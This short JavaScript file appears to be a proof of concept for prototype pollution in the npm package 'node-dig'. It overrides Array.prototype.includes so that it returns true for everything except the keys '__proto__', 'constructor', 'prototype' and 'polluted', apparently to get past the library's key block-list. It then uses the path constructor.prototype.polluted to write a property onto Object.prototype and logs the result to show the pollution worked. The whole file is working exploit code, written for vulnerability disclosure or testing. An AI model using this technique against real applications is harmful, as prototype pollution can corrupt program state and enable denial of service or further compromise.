Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig({}, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);